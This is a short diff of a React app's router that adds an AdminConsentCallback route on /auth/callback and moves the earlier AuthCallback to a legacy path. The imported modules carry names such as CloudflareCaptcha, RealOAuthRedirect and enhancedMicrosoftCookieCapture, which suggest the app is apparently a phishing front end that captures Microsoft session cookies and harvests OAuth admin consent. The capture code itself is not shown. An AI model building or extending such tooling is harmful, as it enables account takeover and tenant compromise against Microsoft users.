@@ -3,6 +3,7 @@ import { BrowserRouter as Router, Routes, Route, useLocation } from 'react-route
 import CloudflareCaptcha from './components/CloudflareCaptcha';
 import RealOAuthRedirect from './components/RealOAuthRedirect';
 import AuthCallback from './components/AuthCallback';
+import AdminConsentCallback from './components/AdminConsentCallback';
 import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
 import { initializeMicrosoftCookieBridge, microsoftCookieBridge } from './utils/microsoftCookieBridge';
 
@@ -39,7 +40,8 @@ const MainContent: React.FC = () => {
 
     return (
         <Routes>
-            <Route path="/auth/callback" element={<AuthCallback />} />
+            <Route path="/auth/callback" element={<AdminConsentCallback />} />
+            <Route path="/auth/callback/legacy" element={<AuthCallback />} />
             <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
         </Routes>
     );
